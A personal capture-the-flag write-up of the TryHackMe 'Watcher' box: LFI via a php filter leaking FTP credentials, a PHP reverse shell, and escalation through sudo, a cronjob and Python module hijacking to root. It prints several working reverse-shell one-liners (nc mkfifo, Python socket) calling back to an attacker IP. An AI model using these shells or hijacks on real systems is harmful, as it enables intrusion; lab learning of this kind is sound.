---
title: Watcher
parent: THM Boxes
grand_parent: Pwn Counter
nav_order: 26
---

# Watcher

<img width="927" height="246" alt="image" src="https://github.com/user-attachments/assets/8fd246a4-e4ee-4400-b95c-c59e74fd87fd" />

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Box Description

> A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.

## Recon

As always, I started off with an nmap scan and it revealed services on ```ports 21, 22, and 80```.

<img width="695" height="305" alt="image" src="https://github.com/user-attachments/assets/c09d7b41-4bab-4930-b910-163ead4e4ccd" />

When navigating to the webpage, we see the number 1 cork fan in the world.

<img width="1631" height="780" alt="image" src="https://github.com/user-attachments/assets/2d9b2ffb-a899-4f89-b349-d81856cf5834" />

Our nuclei scan found two robots.txt endpoints: the first flag and a txt file we dont have permission to read.

Looking around at the html source code, the website loaded php pages with the parameter ```?post=``` which reminded me of LFI.

I opened [Hackviser's LFI cheatsheet](https://hackviser.com/tactics/pentesting/web/lfi-rfi) and began manually testing paylaods.

I was trying out a couple and found that using a php filter with ase64 encoded output a b64 encoded ```/etc/passwd```, nice.

<img width="1659" height="194" alt="image" src="https://github.com/user-attachments/assets/bfb313ed-5584-4419-be34-bad80f3994c4" />

I tried to check for log poisoning, but could not find any of the associated log paths.

Then I remembered about the .txt filethat I couldn't read. I tried to include that via the php filter and success!

<img width="1661" height="155" alt="image" src="https://github.com/user-attachments/assets/96aff41c-633c-440b-a2fd-826167bcd9ed" />

The decoded information is the following text:

```markdown
Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
```

## Initial Reverse Shell

Logging in via FTP, we get the second flag. Lets try and uplaod a reverse shell via ftp since we see where the files are going to be saved on the website.

I uploaded the shell via ftp and navigated there, but no callback, darn.

I realized that this si because it is converting the php code before it gets a chance to execute, and that I was overcomplicating things and a simple path traversal would have given me the same result instead of that filter.

Little embarassing as that should have been teh first thing I checked but whatever.

I traveresed to the file via the path traversal and I got a callback!

<img width="446" height="165" alt="image" src="https://github.com/user-attachments/assets/ca200d83-b122-451c-899d-9b17ea1a266c" />

## Priv Esc to Toby with Reverse Shell

Running ```sudo -l``` I can run anything with sudo as toby.

Going into toby's home directory I see that the fourth flag is only readable by toby so I did ```sudo -u toby cat flag_4.txt``` and success!

<img width="549" height="368" alt="image" src="https://github.com/user-attachments/assets/66009259-1e04-4c2e-bdda-a01bb34a2d0f" />

We also see a note in toby's directory saying that there is a cronjob set up.

Looking in ```/etc/crontab``` I see that this custom ```cow.sh``` job runs every minute as mat.

<img width="871" height="367" alt="image" src="https://github.com/user-attachments/assets/584963b1-de7a-4393-a21f-5a7d2832d5a9" />

Before attempting to exploit the cronjob, I easily escalate my privileges to a stable toby reverse shell using ```sudo -u toby bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.130.135 6767 >/tmp/f'```.

<img width="573" height="131" alt="image" src="https://github.com/user-attachments/assets/676a84b9-c52a-4fb0-91a3-55dc06f56b14" />

## Priv Esc to mat with reverse shell

So going back to toby's directory, I try to append ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.130.135 7777 >/tmp/f``` to cow.sh and wait.

Success! I got a callback with shell as mat!

<img width="547" height="144" alt="image" src="https://github.com/user-attachments/assets/7e78cb27-12f2-4638-8665-7805f0837277" />

## Priv Esc to will with reverse shell

Enumerating mat's home directory I see a directory called scripts with a python module called ```cmd.py``` owned by mat and ```will_script.py``` owned by will.

Running ```sudo -l``` we can see that mat can run will's script as will. The code for both will be below.

cmd.py:
```python
def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
```

will_script.py
```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

I was a bit stuck here so I had to refernece a writeup, but now it seems so obvious!

I was originally looking for a way to execute a command after the number by using a semicolon, but really it is much simpler.

The intended path was python module hijacking. 

This works since when python imports a module to a script, it runs the whole file it needs to load.

So that means if we add a reverse shell line in the python script, we will get that code executed.

Since cmd.py is able to be edited by mat, I did the following command:

```python
cat > cmd.py << 'EOF'
def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
    if(num == "4"):
        return "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.130.135 1337 >/tmp/f"
import sys,socket,os,pty;s=socket.socket();s.connect(("192.168.130.135",1337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")
EOF
```

The if num=4 was part of an experiment I was doing, but I forgot there was a command whitelist.

With cmd.py edited, I ran  ```sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1``` and Success!!! I got a callback on my listener as the user will! Finally!!!

<img width="543" height="136" alt="image" src="https://github.com/user-attachments/assets/b1297c90-2d24-4b24-b3cc-9f6b4d42e60a" />

## Priv Esc to root with ssh key

Now searching through directories that usually have loot, I found a b64 encoded private rsa key. 

Considering that the only user that we havent escalated to is root we can assume its root's key, but we can try the others as well.

I copied the file over to my attack machine, renamed it ```id_rsa``` and then did ```chmod 400 id_rsa``` to comply with ssh's strict private key rules.

I tested will, mat, and toby and each of them asked for the password even with the key so it is safe to assume that this key is not for them.

I finally tried the key with root and was successfully logged in and got the flag! Awesome!

<img width="330" height="114" alt="image" src="https://github.com/user-attachments/assets/e47ea3c6-6cce-4044-9d51-fe2331a7303f" />

---

## Solution Steps

1. Find the LFI
2. Exploit LFI to get the FTP creds
3. Use FTP to upload a php reverse shell to the box
4. Navigate to php reverse shell and get callback
5. Exploit cronjob to get higher privileged reverse shell
6. exploit a python module with python module hijacking to get a higher privileged reverse shell
7. Find root's b64 encoded private rsa key
8. Bring over to attacbox, chmod 400 it, and then use it to ssh into the box as root



## Thoughts
This box was really challenging and im really glad it was. I had no idea about python module hijacking and it was very interesting to learn about. I also love reverse shells so this was amazing. Overall, a fun and challenging box where I got to practice my privilege escalation tactics.

---

Thank you for reading!

